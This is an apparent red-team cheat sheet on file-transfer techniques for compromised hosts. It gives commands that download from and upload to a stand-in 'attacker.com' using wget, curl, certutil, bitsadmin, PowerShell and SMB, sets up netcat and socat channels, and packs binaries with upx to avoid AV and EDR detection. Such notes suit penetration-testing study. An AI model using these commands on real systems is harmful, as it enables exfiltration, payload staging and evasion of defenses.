# File transfer techniques

## Questions to ask yourself
  *  What firewall rules are in place?
  *  Any DPI appliances intercepting traffic?
  *  What AV/EDR solutions are deployed on the victim hosts?

## Things to remember
  *  Consider defenses and choose proto/port/path accordingly
      *  Some protocols/ports may be blocked, don't waste time trying them
      *  Deploying additional tools may trigger an AV action and draw suspicion
  *  Some transfers may require an interactive shell

## Useful tools
  *  [`LOLBAS`](https://lolbas-project.github.io/#) for living off the land
  *  [`exe2hex`](https://github.com/g0tmi1k/exe2hex) for encoding files as a series of commands
  *  [`upx`](https://github.com/upx/upx) for packing executable files
  *  [`xclip`](https://github.com/astrand/xclip) for piping file contents to clipboard
  *  [`scp`](https://man.openbsd.org/scp.1) for transferring files via SSH
  *  [`python`](https://docs.python.org/3/library/http.server.html#module-http.server) and [`php`](https://www.php.net/manual/en/features.commandline.webserver.php) for serving/receiving files via HTTP
  *  [`certutil.exe`](https://lolbas-project.github.io/lolbas/Binaries/Certutil/) and [`bitsadmin`](https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool) are common LOLBINs for file transfers
  *  [`wget`](https://www.gnu.org/software/wget/) and [`curl`](https://curl.se/) for HTTP transfers to/from Linux machines
  *  [`impacket-smbserver`](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) for serving/receiving files via SMB
  *  [`netcat`](https://salsa.debian.org/debian/netcat), [`powercat`](https://github.com/besimorhino/powercat), [`socat`](http://www.dest-unreach.org/socat/) for file transfers over raw TCP

## Copy/paste upload
  *  `exe2hex` used to reconstruct files via encoding and LOLBINS
      *  `xclip` to pipe commands to clipboard for pasting
  *  Effectively transfering a file "inline" over an established C2 channel
  *  Larger executables are cumbersome with this method
      *  Use a packer like `upx` to reduce size
      *  `Golang` binaries are notoriously big, [optimize before packing](https://sibprogrammer.medium.com/go-binary-optimization-tricks-648673cc64ac)

```
upx --best example.exe
exe2hex -x example.exe -p example.cmd
xclip -i example.cmd -selection clipboard
```

## SSH download/upload
  *  `scp` for transferring files via SSH
  *  Consider configuring SSHd/keys on your attacker machine
      *  This will allow for a reverse SSH transfer to the target

```
scp -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" bob@10.0.0.1:/path/to/remote.exe remote-now-local.exe
scp -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" local.exe bob@10.0.0.1:/path/to/local-now-remote.exe
```

## HTTP download
  *  Python `http.server` useful for quickly serving files
  *  `powershell` cmdlets, `certutil.exe`, and `bitsadmin` for HTTP downloads on Windows  
  *  `wget` and `curl` for HTTP downloads on Linux

// Start HTTP server
```
python3 -m http.server 80
```

```
wget http://attacker.com/example.txt
```

```
PS > (New-Object Net.WebClient).DownloadFile('http://attacker.com/example.txt', 'C:\example.txt')
certutil.exe -urlcache -f http://attacker.com/example.txt example.txt
bitsadmin /transfer ExampleJobName /download /priority high http://attacker.com/example.txt C:\example.txt
```

## HTTP upload
  *  `php` command-line server for hosting upload script
      *  Small `upload.php` script handles HTTP POST
      *  Default PHP INI setting `upload_max_filesize` is 2MB: 0 for no restriction
      *  Files with same name will be overwritten: **BE CAREFUL**
  *  `powershell` cmdlets for uploading files via HTTP POST on Windows
  *  `curl` for uploading files via HTTP POST on Linux

// Create `upload.php` and start PHP server
```
echo '<?php move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]); ?>' > upload.php && php -S 0.0.0.0:80 --define upload_max_filesize=0
```

```
curl -i -F file=@/path/to/file http://attacker.com/upload.php
```

```
PS > (New-Object System.Net.WebClient).UploadFile('http://attacker.com/upload.php', 'C:\example.txt')
```

## SMB download/upload
  *  `impacket-smbserver` for creating SMB file shares on Linux
      *  Use `-smb2support` to support newer Windows versions
  *  `copy` command for downloading files from SMB shares on Windows
  *  `smbclient` for interacting with SMB shares on Linux

// Start SMB server
```
impacket-smbserver share .
impacket-smbserver share . -smb2support
```

```
copy \\attacker.com\share\example.txt .
copy example.txt \\attacker.com\share
```

```
smbclient -c 'get example.txt' -N \\\\attacker.com\\share
smbclient -c 'put example.txt' -N \\\\attacker.com\\share
```

## A clowder of cats
  *  `netcat`, `powercat`, `socat` for file transfers over raw TCP
      *  socat supports TLS, used for [encrypted data channels](https://www.query.ai/resources/blogs/creating-a-secure-encrypted-channel-with-socat/)

```
nc -nvlp 4444 < example.txt
nc -nv 10.0.0.1 4444 > example.txt
PS > powercat -c 10.0.0.1 -p 4444 -of example.txt
```

```
socat TCP4-LISTEN:4444,fork,reuseaddr file:example.txt,create
socat TCP4:10.0.0.1:4444 file:example.txt
```

```
openssl genrsa -out enc.key 2048
openssl req -new -key enc.key -x509 -days 365 -out enc.crt
cat enc.key enc.crt > enc.pem
socat SSL-L:4444,cert=enc.pem,verify=0,fork,reuseaddr file:example.txt
socat SSL:127.0.0.1:4444,verify=0 file:example.txt,create
```
